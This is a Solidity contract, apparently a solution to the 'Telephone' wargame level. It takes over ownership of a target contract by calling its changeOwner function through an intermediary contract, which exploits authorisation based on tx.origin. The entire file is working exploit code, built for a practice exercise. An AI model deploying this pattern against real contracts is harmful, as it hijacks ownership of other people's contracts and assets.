// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Telephone} from "./telephone.sol";

contract TelephoneHack {
    Telephone targetIns;

    constructor(address _target) {
        targetIns = Telephone(_target);
    }

    function changeOwner(address _owner) public {
        targetIns.changeOwner(_owner);
    }
}
